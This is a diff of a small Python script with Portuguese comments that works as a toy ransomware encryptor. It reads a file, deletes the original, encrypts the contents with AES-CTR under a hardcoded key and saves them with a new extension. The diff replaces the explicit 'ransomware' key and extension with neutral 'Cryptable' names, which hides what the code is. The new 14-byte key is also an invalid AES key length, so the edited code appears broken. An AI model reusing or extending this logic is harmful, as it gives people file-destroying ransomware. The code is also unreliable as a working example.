@@ -1,5 +1,4 @@
-import os
-import pyaes
+import os, pyaes
 
 ## abrir o arquivo a ser criptografado
 file_name = "teste.txt"
@@ -11,14 +10,14 @@ file.close()
 os.remove(file_name)
 
 ## chave de criptografia
-key = b"testeransomwares"
+key = b"Cryptable@2024"
 aes = pyaes.AESModeOfOperationCTR(key)
 
 ## criptografar o arquivo
 crypto_data = aes.encrypt(file_data)
 
 ## salvar o arquivo criptografado
-new_file = file_name + ".ransomwaretroll"
+new_file = file_name + ".cryptable"
 new_file = open(f'{new_file}','wb')
 new_file.write(crypto_data)
 new_file.close()
